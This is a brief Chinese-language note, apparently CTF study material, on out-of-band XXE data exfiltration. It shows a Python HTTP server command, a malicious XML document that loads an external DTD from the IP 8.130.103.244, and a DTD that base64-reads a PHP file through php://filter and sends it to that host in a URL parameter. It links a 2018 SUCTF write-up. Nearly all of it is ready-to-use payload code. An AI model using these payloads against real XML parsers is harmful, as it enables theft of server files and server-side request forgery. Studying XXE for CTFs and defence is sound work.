用`python`起一个HTTP服务
```powershell
python -m http.server 9001 # 在9001端口开启http服务
```
服务器上准备的文件
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % remote SYSTEM "http://8.130.103.244:9001/send.xml">
%remote;
%all;
%send;
]>
```
```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/show.php?action=view&filename=9.php">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://8.130.103.244:9001/?file=%file;'>">
```
外部实体不仅可以`file`协议读本地文件，也可以用`http`访问指定网址
### 例题
[2018 SUCTF Homework xxe外带数据~~ xxe进行ssrf_HyyMbb的博客-CSDN博客](https://blog.csdn.net/a3320315/article/details/104288865)
